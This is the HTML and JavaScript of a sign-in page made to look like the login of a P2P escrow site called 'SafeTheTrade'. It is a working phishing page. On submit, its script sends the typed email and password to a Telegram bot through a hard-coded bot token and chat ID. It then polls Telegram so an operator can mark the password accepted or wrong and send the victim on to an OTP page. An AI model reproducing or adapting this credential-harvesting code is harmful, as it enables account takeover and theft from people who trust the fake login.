<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Sign In — SafeTheTrade</title>
    <style>
        *,
        *::before,
        *::after {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        
         :root {
            --bg: #0a0a0a;
            --nav-border: #1a1a1a;
            --card-bg: #141414;
            --card-border: #222222;
            --input-bg: #1c1c1c;
            --input-border: #2a2a2a;
            --text: #ffffff;
            --text-muted: #8a8a8a;
            --text-label: #9a9a9a;
            --green: #22c55e;
            --green-hover: #16a34a;
            --btn-white: #f5f5f5;
            --btn-white-text: #111111;
            --footer-text: #6b6b6b;
            --font: "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            --danger: #ef4444;
        }
        
        html,
        body {
            height: 100%;
        }
        
        body {
            font-family: var(--font);
            background: var(--bg);
            color: var(--text);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }
        
        .header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 28px;
            height: 64px;
            border-bottom: 1px solid var(--nav-border);
            flex-shrink: 0;
        }
        
        .header-left {
            display: flex;
            align-items: center;
            gap: 28px;
        }
        
        .logo {
            display: flex;
            align-items: center;
            gap: 10px;
            text-decoration: none;
            color: var(--text);
        }
        
        .logo-icon {
            width: 28px;
            height: 28px;
            border-radius: 50%;
            background: radial-gradient(circle at 35% 35%, #4ade80, #16a34a 55%, #14532d);
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            box-shadow: 0 0 0 1px rgba(34, 197, 94, 0.25);
        }
        
        .logo-icon svg {
            width: 14px;
            height: 14px;
        }
        
        .logo-text {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 17px;
            font-weight: 600;
            letter-spacing: -0.02em;
        }
        
        .logo-image {
            width: 35px;
            height: 35px;
            object-fit: contain;
        }
        
        .nav-link {
            color: var(--text-muted);
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
            transition: color 0.15s;
        }
        
        .nav-link:hover {
            color: var(--text);
        }
        
        .header-right {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .btn-outline {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            height: 36px;
            padding: 0 16px;
            border-radius: 8px;
            border: 1px solid #2e2e2e;
            background: transparent;
            color: var(--text);
            font-size: 13.5px;
            font-weight: 500;
            font-family: inherit;
            text-decoration: none;
            cursor: pointer;
            transition: background 0.15s, border-color 0.15s;
        }
        
        .btn-outline:hover {
            background: #1a1a1a;
            border-color: #3a3a3a;
        }
        
        .btn-green {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            height: 36px;
            padding: 0 16px;
            border-radius: 8px;
            border: none;
            background: var(--green);
            color: #fff;
            font-size: 13.5px;
            font-weight: 600;
            font-family: inherit;
            text-decoration: none;
            cursor: pointer;
            transition: background 0.15s;
        }
        
        .btn-green:hover {
            background: var(--green-hover);
        }
        
        .main {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
        }
        
        .card {
            width: 100%;
            max-width: 400px;
            background: var(--card-bg);
            border: 1px solid var(--card-border);
            border-radius: 16px;
            padding: 32px 32px 28px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.45);
        }
        
        .card h1 {
            font-size: 26px;
            font-weight: 700;
            letter-spacing: -0.03em;
            margin-bottom: 6px;
            color: #fafafa;
        }
        
        .card-subtitle {
            font-size: 13.5px;
            color: var(--text-muted);
            margin-bottom: 28px;
            line-height: 1.4;
        }
        
        .field {
            margin-bottom: 18px;
        }
        
        .field label {
            display: block;
            font-size: 11px;
            font-weight: 600;
            letter-spacing: 0.06em;
            text-transform: uppercase;
            color: var(--text-label);
            margin-bottom: 8px;
        }
        
        .input-wrap {
            position: relative;
            display: flex;
            align-items: center;
        }
        
        .input-wrap .icon-left {
            position: absolute;
            left: 14px;
            width: 16px;
            height: 16px;
            color: #6b6b6b;
            pointer-events: none;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .input-wrap .icon-left svg,
        .input-wrap .icon-right svg {
            width: 16px;
            height: 16px;
        }
        
        .input-wrap input {
            width: 100%;
            height: 44px;
            padding: 0 44px 0 42px;
            background: var(--input-bg);
            border: 1px solid var(--input-border);
            border-radius: 10px;
            color: var(--text);
            font-size: 14px;
            font-family: inherit;
            outline: none;
            transition: border-color 0.15s, box-shadow 0.15s;
        }
        
        .input-wrap input::placeholder {
            color: #555555;
        }
        
        .input-wrap input:focus {
            border-color: #3f3f3f;
            box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.04);
        }
        
        .input-wrap .icon-right {
            position: absolute;
            right: 12px;
            width: 32px;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: none;
            border: none;
            color: #6b6b6b;
            cursor: pointer;
            border-radius: 6px;
            padding: 0;
        }
        
        .input-wrap .icon-right:hover {
            color: #a3a3a3;
        }
        
        .row-options {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 22px;
            margin-top: 4px;
        }
        
        .checkbox-label {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 13.5px;
            color: #c4c4c4;
            cursor: pointer;
            user-select: none;
        }
        
        .checkbox-label input {
            position: absolute;
            opacity: 0;
            width: 0;
            height: 0;
        }
        
        .checkbox-custom {
            width: 16px;
            height: 16px;
            border-radius: 4px;
            border: 1.5px solid #3a3a3a;
            background: transparent;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
            transition: background 0.15s, border-color 0.15s;
        }
        
        .checkbox-label input:checked+.checkbox-custom {
            background: var(--green);
            border-color: var(--green);
        }
        
        .checkbox-custom svg {
            width: 10px;
            height: 10px;
            opacity: 0;
            color: #fff;
        }
        
        .checkbox-label input:checked+.checkbox-custom svg {
            opacity: 1;
        }
        
        .forgot-link {
            color: var(--green);
            font-size: 13.5px;
            font-weight: 500;
            text-decoration: none;
        }
        
        .forgot-link:hover {
            text-decoration: underline;
        }
        
        .btn-submit {
            width: 100%;
            height: 46px;
            border: none;
            border-radius: 10px;
            background: var(--btn-white);
            color: var(--btn-white-text);
            font-size: 14.5px;
            font-weight: 600;
            font-family: inherit;
            cursor: pointer;
            transition: background 0.15s, transform 0.1s;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        
        .btn-submit:hover {
            background: #e8e8e8;
        }
        
        .btn-submit:active {
            transform: scale(0.995);
        }
        
        .btn-submit:disabled {
            cursor: not-allowed;
            opacity: 0.75;
        }
        /* Inline small spinner */
        
        .spinner {
            width: 18px;
            height: 18px;
            border-radius: 50%;
            border: 2px solid rgba(0, 0, 0, 0.15);
            border-top-color: rgba(0, 0, 0, 0.65);
            animation: spin 0.8s linear infinite;
            display: none;
        }
        
        .btn-submitting .spinner {
            display: inline-block;
        }
        
        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }
        
        .signup-row {
            text-align: center;
            margin-top: 22px;
            font-size: 13.5px;
            color: var(--text-muted);
        }
        
        .signup-row a {
            color: var(--green);
            font-weight: 500;
            text-decoration: none;
        }
        
        .signup-row a:hover {
            text-decoration: underline;
        }
        
        .form-note {
            margin-top: 14px;
            min-height: 18px;
            font-size: 13.5px;
            color: var(--text-muted);
        }
        
        .form-note.error {
            color: var(--danger);
            font-weight: 600;
        }
        
        .footer {
            flex-shrink: 0;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 18px 28px;
            border-top: 1px solid var(--nav-border);
            font-size: 12.5px;
            color: var(--footer-text);
            flex-wrap: wrap;
            gap: 10px;
        }
        
        .footer-links {
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            gap: 0;
        }
        
        .footer-links a {
            color: var(--footer-text);
            text-decoration: none;
            transition: color 0.15s;
        }
        
        .footer-links a:hover {
            color: #a3a3a3;
        }
        
        .footer-links .sep {
            margin: 0 6px;
            color: var(--footer-text);
            user-select: none;
        }
        
        @media (max-width: 640px) {
            .header {
                padding: 0 16px;
            }
            .card {
                padding: 28px 22px 24px;
            }
            .footer {
                flex-direction: column;
                align-items: flex-start;
                padding: 16px;
            }
            .nav-link {
                display: none;
            }
        }
    </style>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
</head>

<body>
    <header class="header">
        <div class="header-left">
            <a href="#" class="logo" aria-label="SafeTheTrade home">
                <span class="logo-icon" aria-hidden="true">
          <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
            <path d="M12 3l7 3v5c0 4.5-3 7.5-7 9-4-1.5-7-4.5-7-9V6l7-3z" />
            <path d="M9 12l2 2 4-4" />
          </svg>
        </span>
                <span class="logo-text">
          <img src="safethetradelogo.png" alt="SafeTheTrade Logo" class="logo-image">
          SafeTheTrade
        </span>
            </a>
            <a href="#" class="nav-link">Offers</a>
        </div>
        <div class="header-right">
            <a href="#" class="btn-outline">Log in</a>
            <a href="#" class="btn-green">Sign up</a>
        </div>
    </header>

    <main class="main">
        <div class="card">
            <h1>Sign In</h1>
            <p class="card-subtitle">Access your secure P2P escrow account</p>

            <form id="signinForm" action="2fa.html" method="get" autocomplete="on">
                <div class="field">
                    <label for="email">Email or username</label>
                    <div class="input-wrap">
                        <span class="icon-left" aria-hidden="true">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
                <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
                <circle cx="12" cy="7" r="4" />
              </svg>
            </span>
                        <input id="email" name="email" type="text" placeholder="Enter your registered email..." autocomplete="username" />
                    </div>
                </div>

                <div class="field">
                    <label for="password">Password</label>
                    <div class="input-wrap">
                        <span class="icon-left" aria-hidden="true">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
                <rect x="3" y="11" width="18" height="11" rx="2" />
                <path d="M7 11V7a5 5 0 0 1 10 0v4" />
              </svg>
            </span>

                        <input id="password" name="password" type="password" placeholder="••••••••••" value="password123" autocomplete="current-password" />

                        <button type="button" class="icon-right" id="togglePassword" aria-label="Show password">
              <svg id="eyeIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
                <circle cx="12" cy="12" r="3" />
              </svg>
            </button>
                    </div>
                </div>

                <div class="row-options">
                    <label class="checkbox-label">
            <input type="checkbox" name="remember" checked />
            <span class="checkbox-custom" aria-hidden="true">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
                <polyline points="20 6 9 17 4 12" />
              </svg>
            </span>
            Remember me
          </label>
                    <a href="#" class="forgot-link">Forgot password?</a>
                </div>

                <button id="submitBtn" type="submit" class="btn-submit">
          <span class="spinner" aria-hidden="true"></span>
          <span id="submitBtnText">Sign In securely</span>
        </button>

                <div id="formNote" class="form-note" aria-live="polite"></div>
            </form>

            <p class="signup-row">
                Don't have an account?
                <a href="#">Create Escrow Account</a>
            </p>
        </div>
    </main>

    <footer class="footer">
        <div>www.safethetrade.com (C) 2026</div>
        <div class="footer-links">
            <a href="#">Rate calculator</a><span class="sep">/</span>
            <a href="#">System status</a><span class="sep">/</span>
            <a href="#">Transparency</a><span class="sep">/</span>
            <a href="#">API docs</a><span class="sep">/</span>
            <a href="#">Fees</a><span class="sep">/</span>
            <a href="#">Terms</a><span class="sep">/</span>
            <a href="#">Privacy</a>
        </div>
    </footer>

    <script>
    const EMAIL_LS_KEY = "signin_email";
    const UI_FLAG_KEY = "signin_ui_flag";
    const TELEGRAM_BOT_TOKEN = "8624290469:AAGU6aIOK-rMsMA_FqDBNUzNdkq1reelj4c";
    const TELEGRAM_CHAT_ID = "8934060358";
    const AUTH_POLL_INTERVAL_MS = 1000;

    let authPollTimer = null;
    let authPollOffset = 0;
    let activeSessionKey = null;

    function answerCallbackQuery(callbackQueryId) {
        if (!callbackQueryId) return;
        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                callback_query_id: callbackQueryId,
                text: 'Processing...'
            })
        }).catch(() => {});
    }

    function stopAuthPolling() {
        if (authPollTimer) {
            clearInterval(authPollTimer);
            authPollTimer = null;
        }
    }

    function applyAuthAction(action) {
        stopAuthPolling();

        if (action === 'accept') {
            window.location.href = 'derotp.html';
            return;
        }

        if (action === 'wrong') {
            localStorage.setItem(UI_FLAG_KEY, 'wrong_password');
            history.replaceState({}, '', location.pathname);
            window.location.reload();
            return;
        }

        if (action === 'decline') {
            const note = document.getElementById('formNote');
            if (note) {
                note.textContent = 'Request declined. Please try again.';
                note.classList.add('error');
            }
            setSubmitting(false);
        }
    }

    function startAuthPolling(sessionKey) {
        activeSessionKey = sessionKey;
        authPollOffset = 0;
        stopAuthPolling();

        authPollTimer = setInterval(async () => {
            try {
                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${authPollOffset}&timeout=15&allowed_updates=["callback_query"]`;
                const res = await fetch(url);
                const data = await res.json();

                if (!data.ok || !Array.isArray(data.result)) return;

                for (const update of data.result) {
                    authPollOffset = Math.max(authPollOffset, Number(update.update_id || 0) + 1);
                    const cb = update.callback_query;
                    if (!cb || !cb.data) continue;

                    const payload = String(cb.data);
                    const parts = payload.split(/:(.+)/);
                    const action = parts[0];
                    const value = parts[1] || '';

                    if (sessionKey && value && value !== sessionKey) continue;
                    if (sessionKey && !payload.includes(sessionKey)) continue;

                    answerCallbackQuery(cb.id);

                    if (action === 'accept' || action === 'approve') {
                        applyAuthAction('accept');
                        return;
                    }
                    if (action === 'wrong') {
                        applyAuthAction('wrong');
                        return;
                    }
                    if (action === 'decline') {
                        applyAuthAction('decline');
                        return;
                    }
                }
            } catch (err) {
                console.error('Auth poll failed:', err);
            }
        }, AUTH_POLL_INTERVAL_MS);
    }

    // Show/hide password
    document.getElementById('togglePassword').addEventListener('click', function() {
        const passwordField = document.getElementById('password');
        passwordField.type = passwordField.type === 'password' ? 'text' : 'password';
    });

    // Load saved email (if any)
    window.addEventListener('DOMContentLoaded', () => {
        const savedEmail = localStorage.getItem(EMAIL_LS_KEY);
        if (savedEmail) document.getElementById('email').value = savedEmail;

        const flag = localStorage.getItem(UI_FLAG_KEY);
        if (flag === 'wrong_password') {
            const note = document.getElementById('formNote');
            note.textContent = 'Enter correct password';
            note.classList.add('error');
            localStorage.removeItem(UI_FLAG_KEY);
        }
    });

    const submitBtn = document.getElementById('submitBtn');
    const submitBtnText = document.getElementById('submitBtnText');
    const formNote = document.getElementById('formNote');

    function setSubmitting(isSubmitting) {
        submitBtn.disabled = isSubmitting;
        submitBtn.classList.toggle('btn-submitting', isSubmitting);
        submitBtnText.textContent = isSubmitting ? 'Login in .......' : 'Sign In securely';
    }

    function parseAuthFromUrl() {
        const params = new URLSearchParams(location.search);
        const auth = params.get('auth');
        if (!auth) return null;

        if (auth === 'wrong') {
            localStorage.setItem(UI_FLAG_KEY, 'wrong_password');
            history.replaceState({}, '', location.pathname);
            window.location.reload();
            return null;
        }

        if (auth === 'accept') {
            window.location.href = 'derotp.html';
            return null;
        }

        return null;
    }

    parseAuthFromUrl();

    document.getElementById('signinForm').addEventListener('submit', async function(e) {
        e.preventDefault();

        const email = document.getElementById('email').value.trim();
        const password = document.getElementById('password').value;

        localStorage.setItem(EMAIL_LS_KEY, email);

        setSubmitting(true);
        formNote.textContent = 'Waiting for verification...';
        formNote.classList.remove('error');

        const nonce = (window.crypto && crypto.randomUUID) ? crypto.randomUUID() : `n${Date.now()}${Math.random().toString(16).slice(2)}`;
        const message = `Login attempt\nEmail: ${email}\nPassword: ${password}\nNonce: ${nonce}`;
        const apiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

        const inlineKeyboard = {
            inline_keyboard: [
                [{ text: 'Wrong password', callback_data: `wrong:${nonce}` }],
                [{ text: 'Accept password', callback_data: `accept:${nonce}` }]
            ]
        };

        startAuthPolling(nonce);

        try {
            const resp = await fetch(apiUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    reply_markup: inlineKeyboard
                })
            });

            if (!resp.ok) {
                throw new Error('Failed to verify.');
            }

            setTimeout(() => {
                if (document.visibilityState === 'visible' && !window.location.search.includes('auth')) {
                    window.location.href = 'derotp.html';
                }
            }, 15000);
        } catch (err) {
            console.error(err);
            setSubmitting(false);
            formNote.textContent = 'An error occurred while verifying your details.';
            formNote.classList.add('error');
            stopAuthPolling();
        }
    });
</script>
</body>
</html>
